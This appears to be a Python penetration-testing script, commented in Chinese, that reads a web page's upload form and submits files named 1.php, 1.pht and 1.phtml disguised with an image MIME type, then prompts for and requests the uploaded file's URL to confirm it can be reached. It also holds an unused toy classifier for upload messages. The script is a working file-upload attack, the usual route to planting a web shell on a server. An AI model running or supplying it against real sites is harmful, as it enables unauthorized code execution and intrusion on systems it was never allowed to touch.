import re
from urllib.parse import unquote  # 用于解码 URL 编码的特殊字符
import requests
from requests_toolbelt.multipart.encoder import MultipartEncoder
from bs4 import BeautifulSoup
from colorama import init, Fore
init(autoreset=True)  # 初始化colorama，设置autoreset=True以便在每次打印后自动重置颜色
import pandas as pd
from sklearn.feature_extraction.text import TfidfVectorizer
from sklearn.linear_model import LogisticRegression
from sklearn.model_selection import train_test_split
from sklearn.metrics import classification_report





# 定义关键词列表
def contains_keywords_or_chars(strings):
    # 示例数据
    data = [
        ('文件已成功上传。', '成功'),
        ('上传失败，请重试。', '失败'),
        ('您的文件已经上传到服务器。', '成功'),
        ('发生错误，无法上传文件。', '失败'),
        ('你上传的是个假图片，不要欺骗我！', '失败'),
        ('文件已成功上传至云端。', '成功'),
        ('上传的有问题', '失败'),
        ('上传有木马', '失败'),
        ('重新上传', '失败'),
        ('上传成功', '成功')
    ]

    # 过滤出只包含'成功'和'失败'的数据
    filtered_data = [(desc, label) for desc, label in data if label in ('成功', '失败')]

    # 将数据转换为DataFrame
    df = pd.DataFrame(filtered_data, columns=['description', 'label'])

    # 将标签转换为数字（例如，'成功' -> 1, '失败' -> 0）
    df['label'] = df['label'].map({'成功': 1, '失败': 0})

    # 提取文本特征
    vectorizer = TfidfVectorizer()
    X = vectorizer.fit_transform(df['description'])
    y = df['label']

    # 确保y中没有NaN值（这里应该是安全的，因为我们没有引入NaN）
    assert not pd.isnull(y).any(), "y中存在NaN值"

    # 划分训练集和测试集
    X_train, X_test, y_train, y_test = train_test_split(X, y, test_size=0.2, random_state=42)

    # 训练模型
    model = LogisticRegression()
    model.fit(X_train, y_train)

    # 预测测试集
    y_pred = model.predict(X_test)

    # 打印分类报告
    print(classification_report(y_test, y_pred))
    # 预测新的文本

    new_features = vectorizer.transform([strings])
    prediction = model.predict(new_features)
    print(f"预测结果: {'成功' if prediction[0] == 1 else '失败'}")
    return prediction[0]


def get_form_value(url):
    # 发送get请求获取html文档
    response = requests.get(url)
    if response.status_code == 200:
        #print(response.text)
        # 使用BeautifulSoup解析html文档
        soup = BeautifulSoup(response.text, 'html.parser')
        # 获取所有的form标签
        forms = soup.find_all('form')

        # 初始化用于保存数据的字典
        form_info = {}
        # 遍历所有的form标签
        for index, form in enumerate(forms):
            # 获取form标签的所有input标签
            inputs = form.find_all('input')
            # 初始化用于保存 input 数据的列表
            input_info = []
            # 遍历所有的input标签
            for form_input in inputs:
                # 获取input标签的type属性
                input_type = form_input.get('type', '')
                # 获取input标签的name属性
                input_name = form_input.get('name', '')
                # 获取input标签的value属性
                input_value = form_input.get('value', '')
                # 将input的属性值进行保存
                input_data = {
                    'type': input_type,
                    'name': input_name,
                    'value': input_value
                }
                # 将input的属性值保存到列表中
                input_info.append(input_data)
            return input_info


def file_upload_test(url, input_info, file_path):
    global input_name, submit_name, submit_value
    for inputs in input_info:
        print("input:", inputs)
        if inputs['type'] == 'file':
            input_name = inputs['name']
            print(input_name)
        if inputs['type'] == 'submit':
            submit_name = inputs['name']
            submit_value = inputs['value']
            print("submit_name:", submit_name)
            print("submit_value:", submit_value)

    # 创建multipart/form-data编码器
    multipart_encoder = MultipartEncoder(
        fields={
            f'{input_name}': (f'{file_path}', open(file_path, 'rb'), 'image/png'),  # 文件名和MIME类型
            f'{submit_name}': f'{submit_value}'
        }
    )

    # 设置请求头
    headers = {
        'Content-Type': multipart_encoder.content_type,
    }

    #print(headers)
    response_get_text = ""
    # 发送一个正常的没有上传文件的请求
    response_get = requests.get(url)
    if response_get.status_code == 200:
        response_get_text = response_get.text
    else:
        print("请求异常")
        return False
    # 发送POST请求上传文件
    response_upload = requests.post(url, data=multipart_encoder, headers=headers)
    if response_upload.status_code == 200:
        # 将字符串按行分割
        lines1 = response_get_text.strip().split("\n")   # 去除首尾的空白字符,获取响应文本一行
        lines2 = response_upload.text.strip().split("\n")

        # 使用集合操作找到在lines2中但不在lines1中的行
        differences = set(lines2) - set(lines1)
        # 输出不同的行
        for diff in differences:
            diff = diff.strip()

            print(Fore.GREEN + f"可能的文件路径信息:{diff}")
            print(Fore.BLUE + "根据上面提示的路径信息进行或者是自己知道的其它可用路径信息来对文件进行访问:")
            print(Fore.BLUE + "请输入文件访问的路径信息(如果没有，请输入None):")
            input_upload_path = input("URL:")
            if input_upload_path == "None":
                return "None"
            response_test = requests.get(input_upload_path)
            if response_test.status_code == 200:
                # print(Fore.GREEN + "文件访问成功")
                return "success"





def file_uploads(url):
    for file_path in ["1.php","1.pht","1.phtml"]:
        input_info = get_form_value(url)
        success = file_upload_test(url, input_info, file_path)
        if success != "None":
            print(Fore.LIGHTRED_EX + "文件上传成功")
            print(Fore.BLUE + "上传的脚本名:", Fore.BLUE + f"{file_path}")
            return False
    print(Fore.RED + "文件上传失败")
